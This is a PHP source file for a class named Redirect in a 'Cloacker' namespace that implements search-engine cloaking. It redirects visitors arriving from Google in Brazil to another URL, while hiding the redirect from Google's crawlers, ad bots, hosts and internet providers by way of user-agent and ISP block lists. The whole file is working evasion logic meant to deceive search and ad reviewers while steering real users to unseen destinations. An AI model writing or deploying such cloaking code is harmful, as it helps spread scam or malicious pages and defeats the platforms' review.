<?php
namespace Cloacker;

class Redirect
{
    /**
     * Only with this referer we can do redirect
     */

    CONST ALLOWED_REFFER = 'google';

    /**
     * @var bool
     * Turn off/on redirect
     */
    private $redirect = true;

    /**
     * @var User
     */
    private $user;

    /**
     * @var array
     * Useragents to block (not redirect)
     */
    private $blockUserAgents = array(
        'bot',
        'google',
        'mediapartner',
        'adsbot',
    );

    /**
     * @var string
     * With this host we can not redirect
     */
    private $forbiddenHost = 'google';

    /**
     * @var string
     * With this Internet Provider we can not redirect
     */
    private $forbiddenInternetProvider = 'google';

    /**
     * @var string
     * We can redirect users from this country
     */
    private $country = 'br';

    /**
     * Redirect constructor.
     * @param $ipAddress
     * @param $host
     * @param $referer
     * @param $userAgent
     * Initialization of new User
     */

    function __construct($ipAddress, $host, $referer, $userAgent)
    {
        $this->user = new User($ipAddress, $host, $referer, $userAgent);
    }

    /**
     * @param $redirect_url
     * If all conditions is valid - redirect to specified url
     */

    public function isRedirect($redirect_url)
    {
        if ($this->ifSuccess())  header('Location: '. $redirect_url);
    }

    /**
     * @return bool
     * Check all parameters to be valid
     */

    private function ifSuccess()
    {
        if (
                $this->user->isUserAgentAllowed($this->blockUserAgents)
                &&  $this->user->isRefferGoogle(self::ALLOWED_REFFER)
                && $this->user->isHostAllowed($this->forbiddenHost)
                && $this->redirect
            ){
                return ($this->user->getIsp()->isSameCountry($this->country)
                    && $this->user->getIsp()->isInternetProviderAllowed($this->forbiddenInternetProvider)) ? true : false;
            }else {
                return false;
             }
    }
}
